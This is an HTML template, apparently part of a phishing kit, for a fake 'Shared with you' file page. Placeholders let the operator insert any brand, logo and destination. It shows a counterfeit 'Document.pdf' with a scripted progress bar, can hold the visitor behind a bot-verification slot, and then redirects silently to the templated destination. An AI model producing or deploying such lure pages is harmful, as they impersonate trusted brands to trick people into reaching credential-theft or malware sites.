<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#eef2f7;--card:#fff;--text:#111827;--muted:#6b7280;--line:#e5e7eb;--accent:__ACCENT__}
@media (prefers-color-scheme:dark){:root{--bg:#0b0f16;--card:#121826;--text:#e8edf7;--muted:#94a3b8;--line:#1f2937}}
body{font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:22px}
.card{width:460px;max-width:100%;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:0 20px 50px rgba(15,23,42,.12)}
.head{display:flex;align-items:center;gap:12px;margin-bottom:22px;min-height:40px}
.brand{font-size:14px;font-weight:700;letter-spacing:.2px}
.sub{font-size:11.5px;font-weight:500;color:var(--muted)}
h1{font-size:21px;font-weight:650;letter-spacing:-.2px;margin-bottom:6px}
p{font-size:14px;color:var(--muted);line-height:1.55}
.file{margin-top:20px;display:flex;align-items:center;gap:12px;border:1px solid var(--line);border-radius:12px;padding:12px 14px}
.ficon{width:36px;height:36px;border-radius:9px;background:color-mix(in srgb,var(--accent) 10%,transparent);display:flex;align-items:center;justify-content:center;font-size:16px}
.fname{font-size:13.5px;font-weight:600}
.fmeta{font-size:11.5px;color:var(--muted);margin-top:2px}
.badge{margin-left:auto;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--accent)}
.bar{margin-top:20px;height:4px;background:var(--line);border-radius:4px;overflow:hidden}
.fill{height:100%;width:0;background:var(--accent);border-radius:4px;transition:width .18s linear}
.row{margin-top:14px;display:flex;align-items:center;justify-content:space-between;font-size:12.5px;color:var(--muted)}
.btn{margin-top:18px;display:block;text-align:center;background:var(--accent);color:#fff;text-decoration:none;font-weight:600;font-size:14px;padding:11px;border-radius:10px}
.ts{margin-top:16px}
.spin{display:inline-block;width:11px;height:11px;border:2px solid color-mix(in srgb,var(--accent) 30%,transparent);border-top-color:var(--accent);border-radius:50%;animation:s .8s linear infinite;vertical-align:-1px}
@keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
  <div class="head">__LOGO__<span><span class="brand">__BRAND__</span><span class="sub">Shared with you</span></span></div>
  <h1>__TITLE__</h1>
  <p>__SUBTITLE__</p>
  <div class="file"><span class="ficon">📄</span><span><span class="fname">Document.pdf</span><span class="fmeta">PDF · 1.2 MB · updated just now</span></span><span class="badge">Ready</span></div>
  <div class="bar"><div class="fill" id="fill"></div></div>
  <div class="row"><span><span class="spin"></span> <span id="status"></span></span><span id="pct">0%</span></div>
  <a class="btn" id="open" href="#">__BUTTON__</a>
  <div class="ts"><div id="__ts_slot__"></div></div>
</div>
<script>
var DEST = "__DESTINATION__", DELAY = __DELAY__, MSGS = __MSGS__;
function __finish(){ if(window.__tsPending) return; if(DEST) window.location.replace(DEST); }
window.__tsGo = __finish;
document.getElementById("open").setAttribute("href", DEST || "#");
var fill = document.getElementById("fill"), pct = document.getElementById("pct"), status = document.getElementById("status");
status.textContent = MSGS[0] || "";
var total = DELAY * 1000, step = 40, p = 0;
var t = setInterval(function(){
  p += 100 / (total/step); if(p > 100) p = 100;
  fill.style.width = p + "%"; pct.textContent = Math.round(p) + "%";
  status.textContent = MSGS[Math.min(MSGS.length-1, Math.floor(p/34))] || status.textContent;
  if(p >= 100){ clearInterval(t); __finish(); }
}, step);
setTimeout(function(){ if(window.__tsPending){ window.__tsPending=false; __finish(); } }, (DELAY+4)*1000);
</script>
</body>
</html>
